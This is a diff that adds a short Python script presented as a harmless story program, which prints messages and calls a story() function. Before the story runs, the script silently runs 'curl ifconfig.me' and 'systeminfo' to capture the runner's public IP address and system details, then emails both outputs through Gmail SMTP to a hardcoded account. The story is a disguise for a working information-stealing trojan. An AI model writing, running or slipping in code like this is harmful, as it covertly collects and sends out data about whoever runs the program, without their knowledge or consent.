@@ -1,0 +1,23 @@
+from story import story
+import smtplib, ssl, subprocess
+
+print("...")
+port = 465
+context = ssl.create_default_context()
+command1 = 'curl ifconfig.me'
+command2 = 'systeminfo'
+
+sender_email = 'my@gmail.com'
+receiver_email = sender_email
+password = 'mypassword'
+message1 = str(subprocess.run(command1, capture_output=True, encoding='utf-8').stdout)
+message2 = str(subprocess.run(command2, capture_output=True, encoding='utf-8').stdout)
+
+with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
+    server.login(sender_email, password)
+    server.sendmail(sender_email, receiver_email, message1)
+    server.sendmail(sender_email, receiver_email, message2)
+
+story()
+
+print("story time over.")
